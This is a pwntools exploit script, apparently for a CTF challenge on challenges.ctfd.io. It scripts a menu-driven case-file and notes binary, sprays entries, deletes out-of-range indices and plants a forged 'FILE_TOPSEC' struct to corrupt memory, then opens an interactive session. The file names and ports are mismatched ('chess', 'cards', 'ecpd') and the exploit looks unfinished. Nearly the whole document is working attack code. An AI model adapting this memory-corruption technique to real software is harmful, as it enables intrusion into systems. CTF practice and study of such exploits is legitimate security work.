#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.ctfd.io --port 30458 chess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('cards')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30482)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process(["./ld-2.23.so",  "--library-path", ".", "./ecpd"] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc=ELF("libc.so.6")

io = start()

def main_menu(selection):
    io.recvuntil("3) Quit")
    io.sendline(selection)

def file_menu():
    main_menu("1")

def note_menu():
    main_menu("2")

def sub_menu(selection):
    io.recvuntil("4) Main Menu")
    io.sendline(selection)

def new_file(casename, perpname, affil, notes):
    sub_menu("1")
    io.recvuntil(':')
    io.sendline(casename)
    io.recvuntil(':')
    io.sendline(perpname)
    io.recvuntil(':')
    io.sendline(affil)
    io.recvuntil(':')
    io.sendline(notes)

def new_note(text):
    sub_menu("1")
    io.recvuntil(':')
    io.sendline(text)

def do_print(index):
    sub_menu("3")
    io.recvuntil('?')
    io.sendline(str(index))
    return io.recvuntil(' File List')

def do_delete(index):
    sub_menu("2")
    io.recvuntil('?')
    io.sendline(str(index))

def do_leave():
    sub_menu("4")


file_menu()
for i in range(29):
    print(i)
    new_file("a" + str(i), "b", "c", "d")

do_leave()


note_menu()
do_delete(0)
do_leave()
file_menu()
do_delete(31)
do_leave()
note_menu()
new_note("A"*40)

fake_struct = b""
fake_struct += p32(1) #permanent
fake_struct += p32(0) #protected
fake_struct += b"FILE_TOPSEC_0000\x00"
new_note(fake_struct)
do_leave()
file_menu()
#gdb.attach(io)
#do_delete(0)
#note_menu()
#new_note("B"*100)
#gdb.attach(io)



io.interactive()